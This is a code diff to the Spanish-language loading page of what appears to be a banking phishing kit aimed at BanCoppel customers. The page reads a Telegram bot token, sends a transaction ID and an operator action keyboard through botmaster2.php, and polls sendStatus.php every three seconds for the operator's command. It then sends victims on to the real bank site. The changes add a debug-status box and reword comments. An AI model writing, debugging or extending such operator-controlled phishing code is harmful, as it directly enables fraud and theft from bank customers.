@@ -11,6 +11,7 @@
       height: 100vh;
       background: url('img/fondo.jpg') no-repeat center center fixed;
       background-size: cover;
+      flex-direction: column;
     }
     .blur-overlay {
       position: fixed;
@@ -43,6 +44,14 @@
       font-size: 13px;
       color: black;
     }
+    #debug-status {
+      background: rgba(255,255,255,0.8);
+      padding: 8px 12px;
+      margin-top: 20px;
+      font-size: 14px;
+      border-radius: 10px;
+      color: #000;
+    }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -56,13 +65,16 @@
       <div class="loader"></div>
       <div class="loaderp-text">Cargando...</div>
     </div>
+    <div id="debug-status">Cargando...</div>
   </div>
 
 <script>
 document.addEventListener('DOMContentLoaded', async function () {
+  const debugBox = document.getElementById("debug-status");
+
   const config = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
   if (!config || !config.token || !config.chat_id) {
-    alert("Error cargando configuración del bot.");
+    debugBox.innerText = "❌ Error: No se pudo cargar botconfig.json";
     return;
   }
 
@@ -72,7 +84,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     return window.location.href = "index.html";
   }
 
-  // ✅ Mantener transactionId constante
+  // Usar el mismo transactionId si ya existe
   let transactionId = localStorage.getItem("transactionId");
   if (!transactionId) {
     transactionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
@@ -98,7 +110,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
-  // Enviar mensaje al bot
+  // Enviar datos al bot
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -106,13 +118,17 @@ document.addEventListener('DOMContentLoaded', async function () {
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Escuchar acción cada 3s
+  debugBox.innerText = "🆔 Esperando acción...\nID: " + transactionId;
+
+  // Escuchar acción seleccionada desde el servidor
   revisarAccion(transactionId);
 
   async function revisarAccion(txId) {
     try {
       const res = await fetch(`sendStatus.php?txid=${txId}`);
       const json = await res.json();
+
+      debugBox.innerText = `🆔 ID: ${txId}\n📥 Estado: ${json.status || "esperando"}`;
 
       if (!json.status || json.status === "esperando") {
         return setTimeout(() => revisarAccion(txId), 3000);
@@ -126,10 +142,12 @@ document.addEventListener('DOMContentLoaded', async function () {
         case "finalizar":
         case "confirm_finalizar":
           window.location.href = "https://www.bancoppel.com"; break;
+        default:
+          debugBox.innerText = "⚠️ Acción no reconocida: " + json.status;
       }
 
     } catch (e) {
-      console.error("Error al revisar botón:", e);
+      debugBox.innerText = "❌ Error: " + e.message;
       setTimeout(() => revisarAccion(txId), 3000);
     }
   }
